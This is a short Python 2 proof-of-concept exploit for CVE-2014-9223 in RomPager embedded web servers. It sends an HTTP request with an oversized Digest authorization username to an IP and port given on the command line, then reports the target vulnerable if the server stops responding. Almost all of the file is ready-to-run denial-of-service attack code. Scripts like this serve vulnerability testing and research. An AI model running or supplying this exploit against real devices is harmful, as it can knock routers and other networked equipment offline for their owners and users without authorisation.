import sys
import socket
import traceback
import time
import httplib

def CVE_2014_9223_poc(host):

	pkt = "GET / HTTP/1.1\r\n"
	pkt += "Host: %s\r\n" % (host)
	pkt += "Proxy-Connection: keep-alive\r\n"
	pkt += "Authorization: Digest username=%s\r\n\r\n" % ("A" * 600)
	return pkt

def check_status(host, port):

	status = False

	try:
		conn = httplib.HTTPConnection(host, port, timeout=2)
		conn.request("GET", "/")
		status = True

	except:
		status = False

	finally:
		conn.close()

	return status

def CVE_2014_9223(host, port):

	if check_status(host, port):

		print "[-] Target alive, send the HTTP PoC Packet"

		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(3)
			s.connect((host, port))
			s.send(CVE_2014_9223_poc(host))

		except:
			print "[-] Erros:"
			traceback.print_exc()

		finally:
			s.close()
			del s

		time.sleep(2)
		if check_status(host, port):
			print "[-] Target is alive, not vulnerable"
		else:
			print "[-] Target is DOWN, it's vulnearble"

	else:
		print "[-] The target is already down before we test"
		return

if __name__ == '__main__':
	
	if len(sys.argv) == 3:		
		host = sys.argv[1]
		port = int(sys.argv[2])

		print "\n[*] Check for CVE-2014-9223 (Denial of Service) "
		CVE_2014_9223(host, port)

	else:
		print "=== RomPager CVE-2014-9223 PoC ==="
		print " Usage: python %s <ip> <port>" % sys.argv[0]
